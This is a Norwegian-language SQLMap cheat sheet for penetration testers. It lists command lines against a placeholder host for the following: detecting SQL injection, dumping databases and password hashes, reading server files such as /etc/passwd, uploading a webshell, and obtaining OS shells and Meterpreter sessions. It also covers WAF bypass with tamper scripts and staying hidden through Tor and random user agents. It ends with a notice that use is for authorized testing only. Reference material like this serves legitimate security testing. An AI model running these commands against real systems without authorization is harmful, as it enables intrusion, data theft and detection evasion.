# 💉 SQLMap – komplett hurtigreferanse

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
> **Begreper og versjoner:** Kartlegging (enumeration) samler informasjon om databasen; en payload er testinndata, og tamper-skript endrer skrivemåten. Eksemplene og tredjepartsavbildningen er bevart fra originalen. `--output-dir` velger katalog, ikke HTML-format; originalens registerlinje har `-reg-key`, mens det dokumenterte valget er `--reg-key`. `--identify-waf` er et eldre eksempel; tilgjengelige flagg må kontrolleres for versjonen. Fil-/OS-tilgang krever støtte og rettigheter i målmiljøet. Ingen risk-verdi eller tamper-kombinasjon garanterer skadefri testing eller omgåelse. Se [SQLMaps bruksveiledning](https://github.com/sqlmapproject/sqlmap/wiki/usage).


```
   _____ ____    __    __  __           
  / ___// __ \  / /   /  |/  /___ _____ 
  \__ \/ / / / / /   / /|_/ / __ `/ __ \
 ___/ / /_/ / / /___/ /  / / /_/ / /_/ /
/____/\___\_\/_____/_/  /_/\__,_/ .___/ 
                               /_/      
    Verktøy for automatisk SQL-injeksjon
```

<p align="center">
  <img src="https://img.shields.io/badge/SQLMap-Injection-red?style=for-the-badge" alt="SQLMap">
  <img src="https://img.shields.io/badge/SQL-Injection-orange?style=for-the-badge" alt="SQL Injection">
  <img src="https://img.shields.io/badge/Python-Tool-blue?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Penetration-Testing-purple?style=for-the-badge" alt="Penetration Testing">
</p>

<p align="center">
  <b>🔥 Et kraftig verktøy for automatisering av SQL-injeksjon</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Innledning](#-innledning)
- [Installasjon](#-installasjon)
- [Grunnleggende syntaks](#-grunnleggende-syntaks)
- [Målvalg](#-målvalg)
- [Forespørselsvalg](#-forespørselsvalg)
- [Deteksjonsvalg](#-deteksjonsvalg)
- [Kartlegging](#-kartlegging)
- [Uthenting av data](#-uthenting-av-data)
- [Filoperasjoner](#-filoperasjoner)
- [Tilgang til operativsystemet](#-tilgang-til-operativsystemet)
- [Omgåelsesteknikker](#-omgåelsesteknikker)
- [Tamper-skript](#vanlige-tamper-skript)
- [Praktiske eksempler](#-praktiske-eksempler)
- [Hurtigreferanse](#-hurtigreferanse)
- [Tips og anbefalte arbeidsmåter](#-tips-og-anbefalte-arbeidsmåter)
- [Ressurser](#-ressurser)

---

## 🎯 Innledning

**SQLMap** er et verktøy med åpen kildekode for penetrasjonstesting som automatiserer oppdagelse og utnyttelse av SQL-injeksjon.

### Viktige egenskaper

| Egenskap | Beskrivelse |
|---------|-------------|
| **Automatisk deteksjon** | Oppdager SQL-injeksjon automatisk |
| **Databasestøtte** | MySQL, PostgreSQL, MSSQL, Oracle, SQLite og flere |
| **Full overtakelse** | Identifikasjon av database, uthenting av data og OS-tilgang |
| **Omgåelsesteknikker** | Omgåelse av WAF/IPS med tamper-skript |
| **Flere injeksjonstyper** | Boolsk, feilbasert, Union, stablede og tidsbaserte spørringer |

### Støttede databaser

```
✅ MySQL          ✅ PostgreSQL      ✅ Microsoft SQL Server
✅ Oracle         ✅ SQLite          ✅ IBM DB2
✅ SAP MaxDB      ✅ Firebird        ✅ Sybase
✅ HSQLDB         ✅ Informix        ✅ H2
```

### Typer SQL-injeksjon

| Type | Kode | Beskrivelse |
|------|------|-------------|
| Boolsk blind injeksjon | `B` | Svar som angir sant/usant |
| Feilbasert | `E` | Databasefeil i responsen |
| Union-basert | `U` | Injeksjon med UNION SELECT |
| Stablede spørringer | `S` | Flere spørringer (;) |
| Tidsbasert blind injeksjon | `T` | Forsinkelser i responstiden |
| Inline-spørringer | `Q` | Innebygde (nestede) spørringer |

---

## 📥 Installasjon

### Kali Linux (forhåndsinstallert)
```bash
# Oppdater SQLMap
sudo apt update && sudo apt install sqlmap
```

### Fra GitHub (nyeste versjon)
```bash
# Klon repoet
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Kjør SQLMap
cd sqlmap-dev
python sqlmap.py --version
```

### Med pip
```bash
pip install sqlmap
```

### Docker
```bash
docker pull paoloo/sqlmap
docker run -it paoloo/sqlmap -u "http://target.com/page?id=1"
```

### Kontroller installasjonen
```bash
sqlmap --version
sqlmap -h          # Grunnleggende hjelp
sqlmap -hh         # Utvidet hjelp
```

---

<a id="-grunnleggende-syntaks"></a>
## ⌨️ Grunnleggende syntaks

### Generell syntaks
```bash
sqlmap [options] -u "URL" 
sqlmap [options] -r request.txt
```

### Eksempler for å komme i gang
```bash
# Grunnleggende skanning
sqlmap -u "http://target.com/page.php?id=1"

# Skanning med informasjonskapsel
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Skann en POST-forespørsel
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Skann fra fil
sqlmap -r request.txt

# Helautomatisk modus
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

## 🎯 Målvalg

### Mål-URL (-u)
```bash
# Grunnleggende URL
sqlmap -u "http://target.com/page.php?id=1"

# Flere parametere
sqlmap -u "http://target.com/page.php?id=1&cat=5"

# Angi parameteren som skal testes
sqlmap -u "http://target.com/page.php?id=1&cat=5" -p id

# Test alle parametere
sqlmap -u "http://target.com/page.php?id=1&cat=5" --level=5
```

### Forespørselsfil (-r)
```bash
# Lagre forespørselen fra Burp Suite i en fil
# Skann deretter:
sqlmap -r request.txt

# Eksempel på forespørselsfil:
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# Cookie: session=abc123
#
# username=admin&password=test
```

### Google-dork (-g)
```bash
# Søk i og test Google-resultater
sqlmap -g "inurl:page.php?id="

# Med bestemte sider
sqlmap -g "inurl:product.php?id= site:target.com"
```

### Direkte databasetilkobling (-d)
```bash
# Koble direkte til databasen
sqlmap -d "mysql://user:pass@target.com:3306/database"
sqlmap -d "mssql://user:pass@target.com:1433/database"
```

### Flere mål (-m)
```bash
# Fil med flere URL-er
sqlmap -m targets.txt

# targets.txt:
# http://target1.com/page.php?id=1
# http://target2.com/item.php?id=2
# http://target3.com/view.php?id=3
```

### Konfigurasjonsfil (-c)
```bash
# Bruk konfigurasjonsfil
sqlmap -c sqlmap.conf
```

---

## 📡 Forespørselsvalg

### HTTP-metode og data
```bash
# POST-data
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Angi metode
sqlmap -u "http://target.com/api/user/1" --method=PUT

# JSON-data
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

### Informasjonskapsler
```bash
# Én informasjonskapsel
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Flere informasjonskapsler
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc;auth=xyz"

# Last informasjonskapsler fra fil
sqlmap -u "http://target.com/page.php?id=1" --load-cookies=cookies.txt

# Test parameter i informasjonskapsel
sqlmap -u "http://target.com/page.php" --cookie="id=1*" --level=2
```

### Headere
```bash
# Egendefinert header
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"

# Flere headere
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1\nAccept-Language: en"

# User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Tilfeldig User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Referer
sqlmap -u "http://target.com/page.php?id=1" --referer="http://google.com"
```

### Autentisering
```bash
# Basic-autentisering
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"

# Digest-autentisering
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Digest --auth-cred="user:pass"

# NTLM-autentisering
sqlmap -u "http://target.com/page.php?id=1" --auth-type=NTLM --auth-cred="domain\\user:pass"
```

### Proxy
```bash
# HTTP proxy
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# SOCKS proxy
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"

# Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5

# Kontroller Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor
```

---

## 🔍 Deteksjonsvalg

### Nivå og risiko
```bash
# Nivå (1-5) – antall tester
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Risiko (1-3) – testenes risiko
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# Anbefalt for grundig testing
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

| Nivå | Tester |
|-------|-------|
| 1 | Standard – grunnleggende tester |
| 2 | + Testing av informasjonskapsler |
| 3 | + Testing av User-Agent og Referer |
| 4 | + Flere payloads |
| 5 | + Alle payloads |

| Risiko | Beskrivelse |
|------|-------------|
| 1 | Standard – trygge tester |
| 2 | + Ressurskrevende tidsbaserte tester |
| 3 | + OR-baserte tester (kan endre data!) |

### Valg av teknikk
```bash
# Bestemt teknikk
sqlmap -u "http://target.com/page.php?id=1" --technique=U    # Bare Union
sqlmap -u "http://target.com/page.php?id=1" --technique=B    # Bare boolsk
sqlmap -u "http://target.com/page.php?id=1" --technique=E    # Bare feilbasert
sqlmap -u "http://target.com/page.php?id=1" --technique=T    # Bare tidsbasert
sqlmap -u "http://target.com/page.php?id=1" --technique=S    # Bare stablede spørringer

# Flere teknikker
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# Alle teknikker (standard)
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
```

### Tidsforsinkelser
```bash
# Tid for tidsbasert injeksjon (standard: 5)
sqlmap -u "http://target.com/page.php?id=1" --time-sec=10

# Forsinkelse mellom forespørsler
sqlmap -u "http://target.com/page.php?id=1" --delay=2
```

### Tråder
```bash
# Samtidige forbindelser (standard: 1)
sqlmap -u "http://target.com/page.php?id=1" --threads=10
```

---

## 📊 Kartlegging

### Kartlegging av databasen
```bash
# Hent gjeldende database
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Hent gjeldende bruker
sqlmap -u "http://target.com/page.php?id=1" --current-user

# Kontroller om brukeren er DBA
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# List alle databaser
sqlmap -u "http://target.com/page.php?id=1" --dbs

# List alle brukere
sqlmap -u "http://target.com/page.php?id=1" --users

# List brukernes passord
sqlmap -u "http://target.com/page.php?id=1" --passwords

# List rettigheter
sqlmap -u "http://target.com/page.php?id=1" --privileges

# List roller
sqlmap -u "http://target.com/page.php?id=1" --roles
```

### Kartlegging av tabeller
```bash
# List tabeller i databasen
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# List alle tabeller
sqlmap -u "http://target.com/page.php?id=1" --tables

# Tell tabelloppføringer
sqlmap -u "http://target.com/page.php?id=1" -D database_name --count
```

### Kartlegging av kolonner
```bash
# List kolonner i tabellen
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Søk etter kolonnenavn
sqlmap -u "http://target.com/page.php?id=1" --search -C password
sqlmap -u "http://target.com/page.php?id=1" --search -C email,user
```

### Uthenting av skjema
```bash
# Hent databaseskjemaet
sqlmap -u "http://target.com/page.php?id=1" --schema

# Utelat systemdatabaser
sqlmap -u "http://target.com/page.php?id=1" --schema --exclude-sysdbs
```

---

## 📤 Uthenting av data

### Hent data
```bash
# Hent en bestemt tabell
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# Hent bestemte kolonner
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump

# Hent alle tabeller i databasen
sqlmap -u "http://target.com/page.php?id=1" -D database --dump-all

# Hent alt
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Utelat systemdatabaser
sqlmap -u "http://target.com/page.php?id=1" --dump-all --exclude-sysdbs
```

### Begrens resultatene
```bash
# De første 10 radene
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=1 --stop=10

# Rad 5-15
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=5 --stop=15

# WHERE-betingelse
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --where="admin=1"
```

### Egendefinerte SQL-spørringer
```bash
# Kjør SQL-spørring
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT version()"

# Interaktivt SQL-shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

### Utdataformater
```bash
# Lagre som CSV
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --csv-del=","

# Lagre som HTML
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --output-dir=/tmp/output
```

---

## 📁 Filoperasjoner

### Les filer
```bash
# Les en fil fra serveren
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Les Windows-filer
sqlmap -u "http://target.com/page.php?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"

# Les webkonfigurasjon
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"
```

### Skriv filer
```bash
# Skriv en fil til serveren
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"

# Last opp et webshell
sqlmap -u "http://target.com/page.php?id=1" --file-write="./webshell.php" --file-dest="/var/www/html/cmd.php"
```

---

## 💻 Tilgang til operativsystemet

### Kommandokjøring
```bash
# Kjør OS-kommando
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Interaktivt shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# PowerShell på Windows
sqlmap -u "http://target.com/page.php?id=1" --os-shell --os-cmd="powershell"
```

### Meterpreter-økt
```bash
# Opprett en Meterpreter-økt
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# Med bestemte valg
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --msf-path=/opt/metasploit
```

### SMB-relé
```bash
# SMB-reléangrep
sqlmap -u "http://target.com/page.php?id=1" --os-smbrelay
```

### Registertilgang (Windows)
```bash
# Les registeret
sqlmap -u "http://target.com/page.php?id=1" --reg-read -reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft"

# Legg til registernøkkel
sqlmap -u "http://target.com/page.php?id=1" --reg-add --reg-key="..." --reg-value="..." --reg-data="..." --reg-type=REG_SZ

# Slett registernøkkel
sqlmap -u "http://target.com/page.php?id=1" --reg-del --reg-key="..." --reg-value="..."
```

---

<a id="-omgåelsesteknikker"></a>
## 🛡️ Omgåelsesteknikker

### Omgåelse av WAF/IPS
```bash
# Identifiser WAF
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# Hopp over WAF-deteksjon
sqlmap -u "http://target.com/page.php?id=1" --skip-waf

# Tilfeldig bruk av store og små bokstaver
sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase

# Flere tamper-skript
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between
```

### Vanlige tamper-skript
```bash
# URL-koding
--tamper=charencode

# Dobbel URL-koding
--tamper=chardoubleencode

# Unicode-koding
--tamper=charunicodeencode

# Erstatt mellomrom med kommentarer
--tamper=space2comment
--tamper=space2hash
--tamper=space2morehash

# Endring av store og små bokstaver
--tamper=randomcase
--tamper=lowercase
--tamper=uppercase

# Erstatt nøkkelord
--tamper=between
--tamper=equaltolike
```

### Referanse for tamper-skript

| Skript | Beskrivelse |
|--------|-------------|
| `apostrophemask` | Erstatt apostrof med UTF-8 |
| `apostrophenullencode` | Erstatt apostrof med dobbel Unicode |
| `base64encode` | Base64-kod payloaden |
| `between` | Erstatt `>` med `NOT BETWEEN 0 AND #` |
| `charencode` | URL-kod alle tegn |
| `charunicodeencode` | Unicode-URL-koding |
| `concat2concatws` | Erstatt `CONCAT` med `CONCAT_WS` |
| `equaltolike` | Erstatt `=` med `LIKE` |
| `greatest` | Erstatt `>` med `GREATEST` |
| `halfversionedmorekeywords` | Legg til versjonert MySQL-kommentar |
| `ifnull2ifisnull` | Erstatt `IFNULL` med `IF(ISNULL())` |
| `lowercase` | Erstatt nøkkelord med små bokstaver |
| `modsecurityversioned` | Omgå ModSecurity med versjonert kommentar |
| `modsecurityzeroversioned` | Omgå ModSecurity med nullversjonskommentar |
| `percentage` | Sett prosenttegn foran tegn |
| `randomcase` | Tilfeldig bokstavstørrelse i nøkkelord |
| `randomcomments` | Legg tilfeldige kommentarer til SQL-nøkkelord |
| `securesphere` | Legg til en særskilt streng for å omgå SecureSphere |
| `space2comment` | Erstatt mellomrom med `/**/` |
| `space2dash` | Erstatt mellomrom med bindestrekskommentar `--` |
| `space2hash` | Erstatt mellomrom med `#`-kommentar |
| `space2morehash` | Erstatt mellomrom med `#` og linjeskift |
| `space2mssqlblank` | Erstatt mellomrom med MSSQL-blanktegn |
| `space2mssqlhash` | Erstatt mellomrom med `#` og linjeskift (MSSQL) |
| `space2plus` | Erstatt mellomrom med `+` |
| `space2randomblank` | Erstatt mellomrom med et tilfeldig blanktegn |
| `symboliclogical` | Erstatt `AND`/`OR` med `&&`/`||` |
| `unionalltounion` | Erstatt `UNION ALL` med `UNION` |
| `unmagicquotes` | Erstatt anførselstegn med flerbyteverdien `%bf%27` |
| `uppercase` | Erstatt nøkkelord med store bokstaver |
| `versionedkeywords` | Omslutt nøkkelord med versjonert kommentar |
| `versionedmorekeywords` | Omslutt flere nøkkelord med versjonert kommentar |
| `xforwardedfor` | Legg til falsk `X-Forwarded-For`-header |

---

## 🎬 Praktiske eksempler

### Eksempel 1: Grunnleggende skanning
```bash
# Skann i automatisk modus
sqlmap -u "http://target.com/products.php?id=1" --batch --banner
```

### Eksempel 2: Uthenting av hele databasen
```bash
# Kartlegg og hent ut
sqlmap -u "http://target.com/page.php?id=1" \
    --dbs \
    --batch

# Etter at databasen er funnet
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    --tables \
    --batch

# Hent users-tabellen
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    -T users \
    --dump \
    --batch
```

### Eksempel 3: POST-forespørsel med informasjonskapsel
```bash
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    --cookie="PHPSESSID=abc123" \
    --level=3 \
    --risk=2 \
    --batch
```

### Eksempel 4: Gjennom Burp-proxy
```bash
# Lagre forespørselen fra Burp i fil, og deretter:
sqlmap -r request.txt \
    --proxy="http://127.0.0.1:8080" \
    --batch
```

### Eksempel 5: Omgåelse av WAF
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper=space2comment,randomcase,between \
    --random-agent \
    --level=3 \
    --risk=2 \
    --batch
```

### Eksempel 6: Hent OS-shell
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --os-shell \
    --batch
```

### Eksempel 7: Les sensitive filer
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --file-read="/etc/passwd" \
    --batch
```

---

## 📊 Hurtigreferanse

### Viktige kommandoer

| Kommando | Beskrivelse |
|---------|-------------|
| `-u URL` | Mål-URL med parameter |
| `-r FILE` | Last forespørsel fra fil |
| `--data=DATA` | POST-data |
| `--cookie=COOKIE` | HTTP-informasjonskapsel |
| `--dbs` | List databaser |
| `--tables` | List tabeller |
| `--columns` | List kolonner |
| `--dump` | Hent data |
| `-D DB` | Angi database |
| `-T TABLE` | Angi tabell |
| `-C COLS` | Angi kolonner |
| `--batch` | Ikke-interaktiv modus |

### Deteksjonsvalg

| Valg | Beskrivelse |
|--------|-------------|
| `--level=LEVEL` | Testnivå (1-5) |
| `--risk=RISK` | Risikonivå (1-3) |
| `-p PARAM` | Parameter som kan testes |
| `--technique=TECH` | Injeksjonsteknikk |
| `--threads=N` | Samtidige tråder |

### Utdatavalg

| Valg | Beskrivelse |
|--------|-------------|
| `-v LEVEL` | Detaljnivå (0-6) |
| `--batch` | Spør aldri etter inndata |
| `--flush-session` | Tøm øktbufferen |
| `--output-dir=DIR` | Egendefinert utdatakatalog |

---

## 💡 Tips og anbefalte arbeidsmåter

### Ytelsestips

1. **Start enkelt**
   ```bash
   # Start med lavt nivå
   sqlmap -u "URL" --level=1 --batch
   # Øk ved behov
   ```

2. **Bruk --batch til automatisering**
   ```bash
   sqlmap -u "URL" --batch --dbs
   ```

3. **Spar tid med bestemte tester**
   ```bash
   # Test bare Union-basert
   sqlmap -u "URL" --technique=U
   ```

### Tips for å redusere synlighet

1. **Tilfeldig User-Agent**
   ```bash
   sqlmap -u "URL" --random-agent
   ```

2. **Legg til forsinkelse**
   ```bash
   sqlmap -u "URL" --delay=2
   ```

3. **Bruk Tor**
   ```bash
   sqlmap -u "URL" --tor --check-tor
   ```

### Feilsøking

| Problem | Løsning |
|-------|----------|
| Ingen injeksjon funnet | Øk `--level` og `--risk` |
| WAF blokkerer | Bruk `--tamper`-skript |
| Treg skanning | Reduser `--level`, bruk bestemt `--technique` |
| Tilkoblingsproblemer | Kontroller `--timeout`, `--retries` |

---

## ⚠️ Juridisk merknad

> **ADVARSEL:** SQLMap er et kraftig verktøy som bare skal brukes til **autorisert testing**.
> 
> - ✅ Test systemer du eier
> - ✅ Test med uttrykkelig skriftlig tillatelse
> - ✅ Bruk i lovlige penetrasjonstestoppdrag
> - ❌ Bruk aldri mot systemer uten tillatelse
> - ❌ Bruk aldri til ondsinnede formål
> 
> **Uautorisert tilgang til datasystemer er ulovlig og straffbar.**

---

## 📚 Ressurser

### Offisielle ressurser
- [SQLMaps offisielle nettsted](https://sqlmap.org/)
- [SQLMap på GitHub](https://github.com/sqlmapproject/sqlmap)
- [SQLMap-wiki](https://github.com/sqlmapproject/sqlmap/wiki)

### Læringsressurser
- [OWASP om SQL-injeksjon](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger om SQL-injeksjon](https://portswigger.net/web-security/sql-injection)

### Relaterte hurtigreferanser
- [Metasploit Framework](../../Metasploit/translations/README.nb.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.nb.md)

---

<p align="center">
  <b>💉 Lær testing av SQL-injeksjon!</b><br>
  <i>Med stor makt følger stort ansvar</i>
</p>
